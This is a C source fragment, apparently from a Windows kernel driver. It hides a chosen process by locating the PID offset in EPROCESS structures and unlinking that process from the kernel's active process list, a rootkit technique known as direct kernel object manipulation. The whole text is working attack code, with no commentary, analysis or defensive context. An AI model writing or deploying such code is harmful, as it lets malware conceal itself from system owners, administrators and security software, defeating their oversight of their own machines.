void RemoveLinks(PLIST_ENTRY Current)
{
	PLIST_ENTRY Previous, Next;

	Previous = (Current->Blink);
	Next = (Current->Flink);

	Previous->Flink = Next;
	Next->Blink = Previous;

	Current->Blink = (PLIST_ENTRY)&Current->Flink;
	Current->Flink = (PLIST_ENTRY)&Current->Flink;
}

ULONG FindPIDOffset()
{
	int idx = 0;
	ULONG pid_ofs = 0;
	PEPROCESS eprocs[3];
	ULONG pids[3];

	for (int i = 16; idx < 3; i += 4)
	{
		if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)i, &eprocs[idx])))
		{
			pids[idx] = i;
			idx++;
		}
	}

	for (int i = 0x20; i < 0x300; i += 4)
	{
		if ((*(ULONG*)((UCHAR*)eprocs[0] + i) == pids[0])
			&& (*(ULONG*)((UCHAR*)eprocs[1] + i) == pids[1])
			&& (*(ULONG*)((UCHAR*)eprocs[2] + i) == pids[2]))
		{
			pid_ofs = i;
			break;
		}
	}

	ObDereferenceObject(eprocs[0]);
	ObDereferenceObject(eprocs[1]);
	ObDereferenceObject(eprocs[2]);

	return pid_ofs;
}

VOID HideProcess(UINT32 pid)
{
	ULONG PID_OFFSET = FindPIDOffset();

	if (PID_OFFSET == 0) {
		return;
	}

	ULONG LIST_OFFSET = PID_OFFSET;


	INT_PTR ptr;

	LIST_OFFSET += sizeof(ptr);


	PEPROCESS CurrentEPROCESS = PsGetCurrentProcess();

	PLIST_ENTRY CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	PUINT32 CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);

	if (*(UINT32*)CurrentPID == pid) {
		RemoveLinks(CurrentList);
		return;
	}
	
	PEPROCESS StartProcess = CurrentEPROCESS;

	CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
	CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
	CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);

	while ((ULONG_PTR)StartProcess != (ULONG_PTR)CurrentEPROCESS) {

		if (*(UINT32*)CurrentPID == pid) {
			RemoveLinks(CurrentList);
			return;
		}

		CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
		CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
		CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	}

	return;
}

